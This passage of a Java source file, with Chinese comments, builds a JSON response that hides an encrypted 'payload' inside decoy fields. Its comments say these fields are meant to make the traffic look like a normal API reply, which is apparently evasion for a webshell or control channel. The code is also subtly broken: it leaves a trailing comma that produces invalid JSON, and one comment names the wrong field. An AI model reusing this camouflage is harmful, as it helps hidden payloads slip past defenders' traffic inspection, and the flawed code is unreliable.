     * @param payloadData 加密的payload数据（包含动态标记）
     * @return JSON格式的响应字符串
     */
    private String createJsonResponse(String payloadData) {
        try {
            // 生成一些伪装数据，让JSON看起来像正常的API响应
            StringBuilder jsonBuilder = new StringBuilder();
            jsonBuilder.append("{");
            
            // 添加一些看起来正常的字段
            jsonBuilder.append("\"status\":\"success\",");

   
            // 将真实的payload数据放在user_data字段中
            jsonBuilder.append("\"encrypted_data\":\"").append(escapeJsonString(payloadData)).append("\",");
            
            // 添加一些其他伪装字段
            jsonBuilder.append("\"version\":\"1.0\",");
            jsonBuilder.append("}");
            
            return jsonBuilder.toString();
            
        } catch (Exception e) {
            // 如果JSON构造失败，返回简单格式
            return "{\"user\":\"henry\",\"user_data\":\"" + escapeJsonString(payloadData) + "\"}";
        }
    }
    
    /**
     * 转义JSON字符串中的特殊字符
     * @param input 输入字符串
     * @return 转义后的字符串
     */
    private String escapeJsonString(String input) {
        if (input == null) {
            return "";
        }
        
        StringBuilder escaped = new StringBuilder();
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            switch (c) {
                case '"':
                    escaped.append("\\\"");
                    break;
                case '\\':
                    escaped.append("\\\\");
                    break;
                case '\b':
                    escaped.append("\\b");
                    break;
                case '\f':
                    escaped.append("\\f");
                    break;
                case '\n':
                    escaped.append("\\n");
                    break;
                case '\r':
                    escaped.append("\\r");
                    break;
                case '\t':
                    escaped.append("\\t");
                    break;
                default:
                    if (c < 0x20 || c > 0x7E) {
                        // 转义非ASCII字符
                        escaped.append("\\u").append(String.format("%04X", (int) c));
                    } else {
                        escaped.append(c);
                    }
                    break;
            }
        }
        return escaped.toString();
    }
}
